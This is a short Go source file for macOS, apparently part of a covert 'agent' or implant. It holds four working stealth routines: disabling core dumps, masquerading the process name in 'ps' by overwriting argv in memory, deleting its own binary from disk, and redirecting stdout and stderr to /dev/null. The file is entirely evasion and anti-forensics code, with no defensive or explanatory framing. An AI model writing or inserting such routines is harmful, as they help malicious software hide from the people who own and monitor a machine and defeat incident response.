//go:build darwin

package agent

import (
	"os"
	"unsafe"

	"golang.org/x/sys/unix"
)

func disableCoreDumps() {
	_ = unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
}

func masqueradeProcess(name string) {
	if name == "" {
		return
	}
	// Overwrite os.Args[0] bytes in place so ps output is masked.
	// macOS has no PR_SET_NAME equivalent, but argv overwrite works.
	if len(os.Args) > 0 {
		arg0 := os.Args[0]
		ptr := unsafe.Pointer(unsafe.StringData(arg0))
		buf := unsafe.Slice((*byte)(ptr), len(arg0))
		n := copy(buf, name)
		for i := n; i < len(buf); i++ {
			buf[i] = ' '
		}
	}
}

func selfDeleteBinary() {
	if len(os.Args) > 0 {
		_ = os.Remove(os.Args[0])
	}
}

func silenceOutput() {
	devNull, err := os.OpenFile("/dev/null", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	fd := int(devNull.Fd())
	_ = unix.Dup2(fd, int(os.Stdout.Fd()))
	_ = unix.Dup2(fd, int(os.Stderr.Fd()))
}
